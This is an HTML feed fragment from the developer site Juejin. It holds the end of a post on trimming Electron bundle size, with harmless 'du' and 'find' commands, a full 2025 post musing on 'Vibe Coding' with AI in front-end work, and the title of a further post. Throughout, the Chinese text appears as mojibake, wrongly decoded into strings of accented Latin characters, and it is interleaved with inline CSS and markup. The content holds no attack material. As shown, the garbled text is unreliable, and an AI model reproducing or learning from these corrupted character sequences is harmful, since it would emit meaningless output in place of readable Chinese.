<li>æˆ‘çŸ¥é“ä½“ç§¯æ€ä¹ˆå®šä½ã€æ€ä¹ˆæ”¶æ•›ã€æ€ä¹ˆéªŒè¯</li>
</ul>
<p>å¦‚æœä½ ä¹Ÿåœ¨åš Electronï¼Œå»ºè®®ä½ æŒ‰é¡ºåºåšè¿™å‡ ä»¶äº‹ï¼ˆåŸºæœ¬ä¸ä¼šäºï¼‰ï¼š</p>
<ol>
<li><strong>æ‹†åŒ…çœ‹ä½“ç§¯åˆ†å¸ƒ</strong>ï¼ˆåˆ«å‡­æ„Ÿè§‰ï¼‰</li>
<li><strong>å…³ sourcemap</strong>ï¼ˆå®‰å…¨ + æ¸…çˆ½ï¼‰</li>
<li><strong>æ¸…ç†æ— ç”¨ä¾èµ–ã€åˆ†å¥½ dev/prod</strong>ï¼ˆæœ€ç¨³æœ€å€¼ï¼‰</li>
<li><strong>ç”¨ files ç²¾å‡†å‰”é™¤ node_modules åƒåœ¾æ–‡ä»¶</strong>ï¼ˆä½“ç§¯å¤§å¤´å°±åœ¨è¿™ï¼‰</li>
<li><strong>æ¯æ¬¡ç˜¦èº«éƒ½é…å›å½’æµ‹è¯•</strong>ï¼ˆå°¤å…¶æ˜¯æ›´æ–°é“¾è·¯ï¼‰</li>
</ol>
<h2 data-id="heading-8">é™„ï¼šæˆ‘å¸¸ç”¨çš„æ’æŸ¥å‘½ä»¤</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># çœ‹ä½“ç§¯åˆ†å¸ƒ</span>
<span class="hljs-built_in">du</span> -sh dist dist-electron node_modules
<span class="hljs-built_in">du</span> -sh <span class="hljs-string">"YourApp.app/Contents/Resources"</span>/*

<span class="hljs-comment"># æŸ¥å¤§ä½“ç§¯ sourcemap</span>
find . -name <span class="hljs-string">"*.map"</span> -size +5M -<span class="hljs-built_in">print</span>
</code></pre>
<p>(å®Œ)</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ†2025ï¼Œæˆ‘å¯¹ã€ŒVibe Codingã€çš„ã€Œå½±å“ã€]]></title>    <link>https://juejin.cn/post/7589092567544233993</link>    <guid>https://juejin.cn/post/7589092567544233993</guid>    <pubDate>2025-12-29T09:58:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567544233993" data-draft-id="7589052659435307054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ†2025ï¼Œæˆ‘å¯¹ã€ŒVibe Codingã€çš„ã€Œå½±å“ã€"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-29T09:58:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸çˆ±è¯´è¯éƒ­å¾·çº²"/> <meta itemprop="url" content="https://juejin.cn/user/4103820476156712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ†2025ï¼Œæˆ‘å¯¹ã€ŒVibe Codingã€çš„ã€Œå½±å“ã€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4103820476156712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸çˆ±è¯´è¯éƒ­å¾·çº²
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:58:56.000Z" title="Mon Dec 29 2025 09:58:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœä½ åœ¨ 2022 å¹´é—®æˆ‘ï¼š</p>
<blockquote>
<p>â€œä»¥åå†™ä»£ç æ˜¯ä¸æ˜¯åªè¦è·Ÿ AI èŠå¤©å°±è¡Œï¼Ÿâ€</p>
</blockquote>
<p>æˆ‘å¤§æ¦‚ç‡ä¼šä¸€è¾¹æ•²ç€ <code>useEffect</code>ï¼Œä¸€è¾¹å†·ç¬‘ä¸€å£°ï¼š</p>
<blockquote>
<p><strong>â€œä¸å¯èƒ½ï¼Œå‰ç«¯è¿™æ´»ï¼Œè°å†™è°çŸ¥é“ã€‚é¡¶å¤šå¸®ä½ æœé›†ä¸€ä¸‹ç­”æ¡ˆè€Œå·²â€</strong></p>
</blockquote>
<p>ä½†å¾ˆé—æ†¾ï¼ˆæˆ–è€…å¾ˆå¹¸è¿ï¼‰ï¼Œ<strong>2025 å¹´æˆ‘è¢«è‡ªå·±æ‰“è„¸äº†</strong>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70644996e94d4ab0a140bf61f0c22543~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN54ix6K-06K-d6YOt5b6357qy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607136&amp;x-signature=ihARnWzld6RxPxZ%2BuFzHeDDW518%3D" alt="20a9e1826b59afd.gif" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-0">å‰ç«¯äººçš„ 2025ï¼šä»å†™ä»£ç åˆ°â€œæŒ‡æŒ¥ä»£ç â€</h3>
<p>ä½œä¸ºä¸€ä¸ªå‰ç«¯ï¼Œè¿™å‡ å¹´æˆ‘ä»¬å·²ç»ç»å†äº†å¤ªå¤šã€Œé©å‘½ã€ï¼š</p>
<ul>
<li>ä» jQuery åˆ° Vue / React</li>
<li>ä» class åˆ° hooks</li>
<li>ä» Webpack åˆ° Vite</li>
<li>ä» <code>console.log</code> åˆ°â€¦â€¦è¿˜æ˜¯ <code>console.log</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c2c573605284aea9b532f05862000d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN54ix6K-06K-d6YOt5b6357qy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607136&amp;x-signature=6RPQ0rrXjm2fMct9Nleq04zThas%3D" alt="image.png" loading="lazy"/></p>
<p>è€Œ <strong>Vibe Coding</strong>ï¼Œæ˜¯ 2025 å¹´æˆ‘æ„Ÿå—åˆ°<strong>æœ€ä¸ä¸€æ ·çš„ä¸€æ¬¡å˜åŒ–</strong>ã€‚</p>
<p>ç®€å•è¯´ä¸€å¥è¯å°±æ˜¯ï¼š</p>
<blockquote>
<p><strong>ä»£ç è¿˜æ˜¯è¦äº¤ä»˜çš„ï¼Œä½†å†™ä»£ç è¿™ä»¶äº‹ï¼Œå·²ç»ä¸å®Œå…¨é æ‰‹äº†ã€‚ï¼ˆéª—ä½ çš„ï¼Œæˆ‘è¿˜æ˜¯é æ‰‹ï¼‰</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ä»€ä¹ˆæ˜¯ Vibe Codingï¼Ÿï¼ˆå‰ç«¯è§†è§’ç‰ˆï¼‰</h3>
<p>Vibe Coding è¿™ä¸ªè¯æœ€æ—©æ˜¯ Andrej Karpathy æå‡ºæ¥çš„ï¼Œæ„æ€ä¸æ˜¯â€œæ‘¸é±¼å†™ä»£ç â€ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p><strong>ä½ è´Ÿè´£æè¿°â€œæˆ‘æƒ³è¦ä»€ä¹ˆæ„Ÿè§‰â€ï¼ŒAI è´Ÿè´£æŠŠä»£ç è¡¥é½ã€‚</strong></p>
</blockquote>
<p>æ”¾åˆ°å‰ç«¯ä¸–ç•Œé‡Œï¼Œå¤§æ¦‚æ˜¯è¿™æ ·ï¼š</p>
<p>ä»¥å‰ï¼š</p>
<pre><code class="hljs">è®¾è®¡ç¨¿ â†’ åˆ‡å›¾ â†’ å†™å¸ƒå±€ â†’ è°ƒæ ·å¼ â†’ è”è°ƒæ¥å£ â†’ è‡ªæµ‹ â†’ ä¿® bug â†’ é‡æ„ â†’ å†ä¿® bug â†’ ç­‰ç€æŒ¨éª‚
</code></pre>
<p>ç°åœ¨ï¼š</p>
<pre><code class="hljs">ä¸€å¥è¯ â†’ AI ç”Ÿæˆç»„ä»¶ â†’ æˆ‘è´Ÿè´£æ”¹ç»†èŠ‚ï¼ˆéª—ä½ çš„ï¼Œç»†èŠ‚ä¹Ÿæ˜¯AIæ”¹ï¼‰ + æˆ‘è´Ÿè´£å…œåº•ï¼ˆåŠ é’±å‡çº§AIï¼‰
</code></pre>
<p>ä¾‹å¦‚æˆ‘ç°åœ¨ä¼šç›´æ¥è·Ÿ AI è¯´ï¼š</p>
<blockquote>
<p>â€œå¸®æˆ‘å†™ä¸€ä¸ª React ç»„ä»¶ï¼š</p>
<ul>
<li>åˆ—è¡¨å¸ƒå±€</li>
<li>éª¨æ¶å±</li>
<li>æ”¯æŒç©ºæ€</li>
<li>æ ·å¼åç®€æ´ï¼Œåƒæ˜é‡‘é‚£ç§â€</li>
</ul>
</blockquote>
<p>ç„¶åå®ƒçœŸçš„ä¼šç»™æˆ‘ä¸€ä¸ª<strong>èƒ½è·‘ã€ç»“æ„è¿˜ä¸é”™çš„ç»„ä»¶</strong>ã€‚</p>
<p>æ˜¯çš„ï¼Œç¬¬ä¸€æ¬¡ç”¨çš„æ—¶å€™æˆ‘å¿ƒé‡Œåªæœ‰ä¸€å¥è¯ï¼š</p>
<blockquote>
<p><strong>â€œå‰ç«¯è¦å¤±ä¸šäº†ï¼Ÿè¿™è¿˜è¦æˆ‘å¹²å˜›ï¼Ÿâ€</strong></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c237800554c845ce9c3f151eca995cef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN54ix6K-06K-d6YOt5b6357qy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607136&amp;x-signature=tLmoThAjxNcWF9%2BdXrQjwPYTb1E%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-2">çœŸé¦™ç°åœºï¼šæˆ‘çš„ Vibe Coding æ—¥å¸¸</h3>
<h4 data-id="heading-3">1ï¸âƒ£ å†™ä¸šåŠ¡ä»£ç æ›´åƒâ€œReview ä»£ç â€</h4>
<p>2025 å¹´æˆ‘å†™å‰ç«¯ï¼Œæµç¨‹æ˜æ˜¾å˜äº†ï¼š</p>
<ul>
<li>ä¸å†ä» <code>index.tsx</code> å¼€å§‹æ•²</li>
<li>è€Œæ˜¯ä» <strong>Prompt å¼€å§‹</strong></li>
</ul>
<p>AI å…ˆæŠŠï¼š</p>
<ul>
<li>ç»„ä»¶ç»“æ„</li>
<li>hooks æ‹†åˆ†</li>
<li>åŸºç¡€æ ·å¼</li>
</ul>
<p>éƒ½ç»™æˆ‘æ­å¥½ã€‚</p>
<p>æˆ‘åšçš„äº‹æƒ…å˜æˆäº†ï¼š</p>
<ul>
<li>çœ‹é€»è¾‘æ˜¯å¦åˆç†</li>
<li>æ”¹çŠ¶æ€å‘½å</li>
<li>ä¼˜åŒ–è¾¹ç•Œæƒ…å†µ</li>
<li>é˜²æ­¢â€œAI è¿‡åº¦è‡ªä¿¡â€</li>
</ul>
<p>ä»¥å‰æˆ‘å†™ 100 è¡Œä»£ç <br/>
ç°åœ¨æˆ‘ <strong>review 100 è¡Œä»£ç </strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d692d6662dc4ca28f0ae85a1a12a4c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN54ix6K-06K-d6YOt5b6357qy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607136&amp;x-signature=373od7KZXuGBYciwonh%2FXYc43uY%3D" alt="image.png" loading="lazy"/></p>
<p>è¯´å®è¯ï¼Œæ›´åƒä¸€ä¸ªï¼š</p>
<blockquote>
<p><strong>â€œå‰ç«¯æ¶æ„å¸ˆï¼ˆä¼ªï¼‰â€</strong></p>
</blockquote>
<hr/>
<h4 data-id="heading-4">2ï¸âƒ£ å¯¹â€œå†™æ ·å¼â€çš„æ€åº¦å‘ç”Ÿäº†å˜åŒ–</h4>
<p>ä½œä¸ºå‰ç«¯ï¼Œæˆ‘ä»¬éƒ½æ‡‚å†™ CSS æ˜¯ä»€ä¹ˆä½“éªŒï¼š</p>
<blockquote>
<p>â€œå°±å·® 1pxï¼Œä½†æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚â€</p>
</blockquote>
<p>ç°åœ¨æˆ‘ä¼šç›´æ¥å‘Šè¯‰ AIï¼š</p>
<blockquote>
<p>â€œè¿™ä¸ªæŒ‰é’®çœ‹èµ·æ¥æœ‰ç‚¹å»‰ä»·ï¼Œå¸®æˆ‘è°ƒæ•´ä¸‹å±‚æ¬¡æ„Ÿã€‚â€</p>
</blockquote>
<p>ä½ åˆ«è¯´ï¼Œå®ƒæœ‰æ—¶å€™çœŸçš„èƒ½è°ƒå¾—<strong>æ¯”æˆ‘æ‰‹å†™è¿˜é¡ºçœ¼</strong>ã€‚</p>
<p>è™½ç„¶æˆ‘è¿˜æ˜¯ä¼šæ”¹ï¼Œä½†è‡³å°‘ä¸å†æ˜¯ä»é›¶å¼€å§‹å¯¹ç€ <code>margin</code> å‘å‘†ã€‚</p>
<hr/>
<h4 data-id="heading-5">3ï¸âƒ£ Vibe Coding â‰  ä¸æ€è€ƒ</h4>
<p>è¿™é‡Œå¿…é¡»è¯´ä¸€å¥å®è¯ï¼š</p>
<blockquote>
<p><strong>AI å†™çš„ä»£ç ï¼Œ80% å¯ç”¨ï¼Œ20% ä¸å¯ä¿¡ã€‚æˆ‘è‡ªå·±çš„è¯åˆšå¥½åè¿‡æ¥</strong></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f08e7d690eb4afba9fbdb98288d612f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN54ix6K-06K-d6YOt5b6357qy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607136&amp;x-signature=KS2asRDdF1pJHmKzaybTBJFLJxE%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>è¾¹ç•Œæ¡ä»¶</li>
<li>æ€§èƒ½</li>
<li>çŠ¶æ€ç®¡ç†å¤æ‚åº¦</li>
<li>çœŸå®ä¸šåŠ¡åœºæ™¯</li>
</ul>
<p>è¿™äº›ä¸œè¥¿ï¼Œ<strong>AI ç›®å‰è¿˜åšä¸å¥½æœ€ç»ˆå†³ç­–</strong>ã€‚</p>
<p>æ‰€ä»¥ Vibe Coding å¯¹å‰ç«¯çš„è¦æ±‚åè€Œæ›´é«˜äº†ï¼š</p>
<ul>
<li>ä½ è¦èƒ½åˆ¤æ–­â€œè¿™æ®µä»£ç é ä¸é è°±â€</li>
<li>ä½ è¦èƒ½æ”¹ï¼Œè€Œä¸æ˜¯ç…§å•å…¨æ”¶</li>
<li>ä½ è¦æ‡‚â€œä¸ºä»€ä¹ˆä¸èƒ½è¿™ä¹ˆå†™â€</li>
<li>ä½ è¦æ¸…æ¥šï¼ŒAIåˆ°åº•æ”¹äº†ä½ å“ªä¸ªæ–‡ä»¶</li>
</ul>
<hr/>
<h3 data-id="heading-6">å‰ç«¯åœ¨ Vibe Coding æ—¶ä»£çš„å˜åŒ–</h3>
<h4 data-id="heading-7">æŠ€èƒ½é‡å¿ƒçœŸçš„åœ¨è¿ç§»</h4>
<p>2025 å¹´ï¼Œæˆ‘æ˜æ˜¾æ„Ÿè§‰åˆ°ï¼š</p>
<ul>
<li>å†™ä»£ç ä¸å†æ˜¯æœ€ç¨€ç¼ºèƒ½åŠ›</li>
<li><strong>è¡¨è¾¾éœ€æ±‚ã€æ‹†è§£é—®é¢˜ã€è®¾è®¡ç»“æ„</strong>æ›´é‡è¦</li>
</ul>
<p>èƒ½æŠŠä¸€å¥æ¨¡ç³Šçš„è¯ï¼Œè¯´æˆ AI èƒ½ç†è§£çš„ Promptï¼Œæœ¬èº«å°±æ˜¯æŠ€æœ¯æ´»ã€‚
åœ¨ä½¿ç”¨AIç”Ÿæˆè®¾è®¡å›¾çš„æ—¶å€™ï¼Œå°±æ›´æ˜æ˜¾äº†ï¼Œæˆ‘å¾—å…ˆæ€è€ƒè‡ªå·±æƒ³è¦ä»€ä¹ˆæ ·çš„é¡µé¢å’ŒåŠŸèƒ½</p>
<p>å‰ç«¯ä¸å†åªæ˜¯ï¼š</p>
<blockquote>
<p>â€œæŠŠé¡µé¢å†™å‡ºæ¥çš„äººâ€</p>
</blockquote>
<p>è€Œæ˜¯ï¼š</p>
<blockquote>
<p>â€œæŠŠæƒ³æ³•å˜æˆå¯æ‰§è¡Œæ–¹æ¡ˆçš„äººâ€</p>
</blockquote>
<hr/>
<h4 data-id="heading-8">AI æ²¡æŠ¢èµ°æˆ‘çš„å·¥ä½œï¼Œä½†æŠ¢èµ°äº†æˆ‘ä¸€éƒ¨åˆ†â€œä½“åŠ›æ´»â€</h4>
<p>å®ƒå¸®æˆ‘å¹²æ‰äº†ï¼ˆçœæ‰äº†ï¼‰ï¼š</p>
<ul>
<li>é‡å¤çš„ CRUD ç»„ä»¶</li>
<li>æ¨¡æ¿åŒ–çš„é¡µé¢ç»“æ„</li>
<li>æ— èŠä½†å¿…é¡»å†™çš„ä»£ç </li>
<li>æ‰‹åŠ¨æŸ¥è¯¢æ–‡æ¡£</li>
<li>åˆ†ææ—§çš„ä»£ç </li>
</ul>
<p>è®©æˆ‘èƒ½æŠŠç²¾åŠ›èŠ±åœ¨ï¼š</p>
<ul>
<li>ä½“éªŒ</li>
<li>äº¤äº’</li>
<li>æ¶æ„</li>
<li>æ€§èƒ½</li>
<li>å¯ç»´æŠ¤æ€§</li>
</ul>
<p>è¯´å®è¯ï¼Œç›®å‰æˆ‘éå¸¸äº«å—è¿™ä¸ªè¿‡ç¨‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64cad00798d14492b607f20f8c56afa9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN54ix6K-06K-d6YOt5b6357qy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607136&amp;x-signature=IjT%2BN3lmxWet%2B%2F%2FFm5BYhT2Ci4c%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-9">å†™åœ¨æœ€åï¼š2025ï¼Œæˆ‘çš„ Vibe Coding æ—¶åˆ»</h3>
<p>2025 å¹´ï¼Œæˆ‘ä¸å†çº ç»“ï¼š</p>
<blockquote>
<p>â€œAI ä¼šä¸ä¼šå–ä»£å‰ç«¯ï¼Ÿâ€
ï¼ˆå› ä¸ºæˆ‘ä»¬æ”¹å˜ä¸äº†AIå‘å±•ï¼‰</p>
</blockquote>
<p>è€Œæ˜¯æ›´å…³å¿ƒï¼š</p>
<blockquote>
<p><strong>â€œæˆ‘èƒ½ä¸èƒ½ç”¨å¥½ AIï¼Œæˆä¸ºæ›´å¥½çš„å‰ç«¯ã€å…¨å¹²ï¼Ÿï¼ˆæ‰“ä¸è¿‡å°±åŠ å…¥ï¼‰â€</strong></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f28634b020774620bbf6ac7ca98a710c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN54ix6K-06K-d6YOt5b6357qy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607136&amp;x-signature=gaw71WwVv3R%2FAFkWng%2Fiku4ePVQ%3D" alt="image.png" loading="lazy"/></p>
<p>Vibe Coding ä¸æ˜¯è®©ä½ ä¸å†™ä»£ç <br/>
è€Œæ˜¯è®©ä½ ï¼š</p>
<ul>
<li>å°‘å†™é‡å¤ä»£ç </li>
<li>å¤šåšæœ‰ä»·å€¼çš„å†³ç­–</li>
<li>æŠŠæ—¶é—´ç”¨åœ¨â€œäººè¯¥å¹²çš„äº‹â€ä¸Š</li>
</ul>
<p>å¯¹æˆ‘æ¥è¯´ï¼Œ2025 å¹´æœ€å¤§çš„å˜åŒ–ä¸æ˜¯å·¥å…·å‡çº§<br/>
è€Œæ˜¯<strong>å†™ä»£ç çš„å¿ƒæ€å˜äº†</strong>ã€‚</p>
<p>å¦‚æœä½ ä¹Ÿæ˜¯å‰ç«¯ï¼Œæˆ‘æƒ³è·Ÿä½ è¯´ä¸€å¥ï¼š</p>
<blockquote>
<p><strong>å‰ç«¯å·²æ­»ã€‚</strong></p>
</blockquote>
<h2 data-id="heading-10"><strong><p align="center"> ä¸‹æ¬¡å†è§ï¼ğŸŒˆ</p></strong></h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eee96f98257840b7a90353fc8156e955~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN54ix6K-06K-d6YOt5b6357qy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767607136&amp;x-signature=a5ymCGqXizgVHeMGaPrPUc2%2F7Yg%3D" alt="Snipaste_2025-04-27_15-18-02.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025ï¼Œæˆ‘ä¸å†å†™ä»£ç ï¼Œæˆ‘åœ¨å½“ä»£ç çš„â€œå®¡æ ¸å‘˜â€]]></title>    <link>https://juejin.cn/post/7589052659435814958</link>    <guid>https://juejin.cn/post/7589052659435814958</guid>    <pubDate>2025-12-29T10:00:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589052659435814958" data-draft-id="7589107312112320521" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025ï¼Œæˆ‘ä¸å†å†™ä»£ç ï¼Œæˆ‘åœ¨å½“ä»£ç çš„â€œå®¡æ ¸å‘˜â€"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹,Vue.js"/> <meta itemprop="datePublished" content="2025-12-29T10:00:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é»‘åœŸè±†"/> <meta itemprop="url" content="https://juejin.cn/user/3421335917433006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025ï¼Œæˆ‘ä¸å†å†™ä»£ç ï¼Œæˆ‘åœ¨å½“ä»£ç çš„â€œå®¡æ ¸å‘˜â€
